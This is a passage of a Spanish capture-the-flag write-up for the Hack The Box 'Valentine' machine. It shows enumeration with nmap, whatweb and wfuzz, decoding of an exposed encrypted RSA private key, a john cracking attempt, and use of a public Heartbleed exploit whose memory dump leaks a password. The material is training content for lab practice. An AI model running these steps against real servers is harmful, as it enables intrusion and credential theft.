Nmap done: 1 IP address (1 host up) scanned in 32.93 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 5.9p1 Debian 5ubuntu1.10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.2.22&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;443&lt;/td&gt;
      &lt;td&gt;HTTPS&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.2.22&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vemos que se estan ejecutando servicios web, asi que con &lt;code&gt;whatweb&lt;/code&gt; vamos a tratar de identificar sus tecnologias.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.79
http://10.10.10.79 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
❯ whatweb https://10.10.10.79
https://10.10.10.79 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que el servicio usa &lt;code&gt;php&lt;/code&gt;, seguidamente vamos a abrirlo en el navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Valentine/vale1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como obervamos una imagen, vamos a descargarla para tratar si existen metadatos ocultos, para ello usaremos &lt;code&gt;exiftool&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ exiftool valentine.jpg
ExifTool Version Number         : 12.16
File Name                       : valentine.jpg
Directory                       : .
File Size                       : 150 KiB
File Modification Date/Time     : 2023:06:24 23:14:44+00:00
File Access Date/Time           : 2023:06:24 23:14:44+00:00
File Inode Change Date/Time     : 2023:06:24 23:15:00+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1200
Image Height                    : 627
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1200x627
Megapixels                      : 0.752
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No encontramos información relevante en la imagen, asi que vamos a tratar de enumerar directorios en la web, para ello vamos a usar &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.79/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.79/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000015:   200        1 L      2 W        38 Ch       &quot;index&quot;                                                                                                               
000000834:   301        9 L      28 W       308 Ch      &quot;dev&quot;                                                                                                                 
000023112:   200        27 L     54 W       554 Ch      &quot;encode&quot;                                                                                                              
000024243:   200        25 L     54 W       552 Ch      &quot;decode&quot;                                                                                                              
000029901:   200        619 L    5759 W     145482 Ch   &quot;omg&quot;                                                                                                                 
000045240:   200        1 L      2 W        38 Ch       &quot;http://10.10.10.79/&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que existe un directorio &lt;code&gt;dev&lt;/code&gt;, y si lo visulizamos en el navegador este tiene como contenido dos archivos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Valentine/vale2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si visualizamos el archivo &lt;code&gt;hype_key&lt;/code&gt;, vemos contenido en formato hexadecimal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Valentine/vale3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a transformar el contenido para que ver a que corresponde para ello usaremos &lt;code&gt;xxd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
&quot; | xxd -ps -r; echo
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos una clave &lt;code&gt;id_rsa&lt;/code&gt; que esta encriptada, asi que con &lt;code&gt;ssh2john&lt;/code&gt; vamos a obtener un hash de la clave y con &lt;code&gt;john&lt;/code&gt; trataremos de decencriptarla y obtener la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /usr/share/john/ssh2john.py id_rsa
id_rsa:$sshng$1$16$AEB88C140F69BF2074788DE24AE48D46$1200$0db3eb3bbf247a036e9350c0aa500de636e35efd0f3eca20de375b3054bc884f69dd438bd25174c5fecfce6ae40daf11e72fdbe3afbd9c4a4231f4cf84db8945c5b653680970e147fbd4490c10b95093144b5fe08c1ffbfcccb4d0cc31f9a23ad0423449b3985005755b8115ee6f7a42c663af026f9e355a7e6e95b0a6933c11e9ba07004af32acfbe96e9a6d165e5e211bc3aea18c5980bb8033a9c33f92280d4453d8b8d897ad7b35c3f75e2c2a8227e11ad53f3395ab3a7dc9a133c03ef0f39704a35eea5d7b84a693eb0167a7979739a5081ef1e7bcee9270755646b67bd1f7297298a62f5c35dd381d77602219da472c9a585082393ee3bac7e2d2f27d6bfc658ca923848a63510f58ffe7dff8bb744ead308a7a8f43b1346ab3693548741d5b01706976d8c93d6ec403129791eaf4e0f91c9f06d11e8923946f08d5108f0c741484e38cc8e72c8a718ef7eaf84a74803d1473294a9baac266a69cc2749d7475bc5b72f12660b17715b996de5d3e30240584549e5f751120a20f867eb823a5ea32c50f691a38b7eec9e7b47d809bec64ea39eec498c0777c623049d5bc382f0d593930a6373410b6e551aeae94eb7d82b4a8b114c2b19775e0e3edb386cbb292b130c3ac8272a5a17be794f392c12a56cbd5a9eb2f175fcf85e34af19795ea8435018729350b760f3a20ee3ce9cc5da2297b57606f435d0f533d65048d50bc350c70863cfe09492c57ec159d0ca6809d626f160940e2814105503cb803cc7d5d971509e3c144f96cf2c2eb9b45b2da11b53675b92aee6a2dbb9314e72d0fb043cee531a75db3519035e1ac2927fc47faec44a79e29c8a50de3c28de68baadab19e136816d834331b7aaf681bd44025a10ea38394db8f927baae61764fca50658cda7d195a629cf7372a91edb6f81ba6d7e258412c6589f9c993e152bf50af4f2990ec40ad7136763ede5fe6eaeb9eb7e4e27a4ea1db0254d0d51b3d3ee96b4bb2b848b5fb9d8f3dfd1679a1241ed95591c9367515f9e0252b2ff7e31fbf3df8d656f33885a693b59f11c59c1dcd7a9fd57421b48d00b9e34e1bc470f9327b506c7d26ec7fd160b946648070279df44a906546d4e572bb073f2d58e66e16732b02e169944d77c1c433ce9f3688cfd3d9d58d3698b565179344a2d56d36c1bbb53732fed5383d2293722121421588d2aa2c86f9653b2302b7614e64a7708275849ccfadd0da941a7f17d26eebf808c9cda5d8ab54a128e674517cafe268bdd7d51dc3c55f1e49814a14bea9aa9b97718e58649180a7e271b27210f42172c48b7dd9fad7ce7b2386561af2cbdb54d35f93ff5fc97ea8a76e2b2f60f2112a58a67b2e90108506464758d37278dedbe46853542a1d1e1cc75457a14ee06ba7e56e3ea6aa0ef30255ed436426f832302332c95ffbdc4af935c42f789c98838145d3f2c3a7bf2654255519664a116923c79bffc56c4f22527be6fce77cee576a8bb2e2da04cc582a6dfecc40c80ef78a3cd69a59980472ac729420bfc14c945e5309e74370e8935530cf0b7828a2dce116974967f4bd5bfcd5e91e319af161c74e3a088a5079a8d532cb049e4c11766b04655c7f41ae4646e0573881d996fc8cd345481991b31064d2087f38f542e8a5455066fc5efa63f60cae69ccf64ff5c52188b24c02510fbde42187244f0c9210f7
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora si tratamos de crackear el hash con &lt;code&gt;john&lt;/code&gt; haciendo uso del &lt;code&gt;rockyou.txt&lt;/code&gt;, vemos que no podemos obtener la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates left, minimum 4 needed for performance.
0g 0:00:00:03 DONE (2023-06-24 23:29) 0g/s 4039Kp/s 4039Kc/s 4039KC/sa6_123..*7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como no encontramos nada, vamos a usar los scripts &lt;code&gt;vuln and safe&lt;/code&gt; de nmap para tratar de encontrar vulnerabilidades asociadas al ssl del servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script &quot;vuln and safe&quot; -p443 10.10.10.79 -oN sslScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 23:34 GMT
Nmap scan report for 10.10.10.79
Host is up (0.11s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       http://www.cvedetails.com/cve/2014-0224
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the &quot;POODLE&quot; issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf

Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El escaneo nos reporta que el servicio es vulnerable a &lt;code&gt;Heartbleed&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Heartbleed: La extensión Heartbeat para los protocolos Transport Layer Security y Datagram Transport Layer Security se propuso como un estándar en febrero del 2012 por el RFC 6520. Esto provee una forma de probar y mantener viva un enlace de comunicación segura sin la necesidad de renegociar la conexión cada vez.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;La vulnerabilidad se da en la versión 1.0.1 y consiste basicamente en que permite a un atacante leer la memoria de un servidor o un cliente y permitiendo por ejemplo conseguir las claves privadas ssl.&lt;/p&gt;

&lt;p&gt;A continuación un articulo donde puedes investigar mas a detalle:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Heartbleed&quot;&gt;https://es.wikipedia.org/wiki/Heartbleed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para explotar la vulnerabilidad, vamos a usar el exploit de &lt;code&gt;akhld&lt;/code&gt; de github.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/akhld/heartbleed&quot;&gt;https://github.com/akhld/heartbleed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos descargamos el repositorio y ejecutamos el &lt;code&gt;exploit&lt;/code&gt; con los parametros correspondientes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 heartbleed.py 10.10.10.79 -p 443  | grep -v &quot;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&quot;
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....&quot;.
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 8E  mV0aGVoeXBlCg==.
  0160: EB D0 07 D2 E4 B9 3C 25 BC FE FB 22 D8 4A AC 41  ......&amp;lt;%...&quot;.J.A
  0170: BC 2D 71 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  .-q.............

WARNING: server returned more data than it should - server is vulnerable!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit funciona correctamente, vemos que se filtra cadenas de información y una de ellas corresponde a un formato en base64 &lt;code&gt;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si ahora tratamos de decodear la cadena, obtnemos un texto que parece corresponde a una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&quot; | base64 -d
heartbleedbelievethehype
&lt;/code&gt;&lt;/pre&gt;

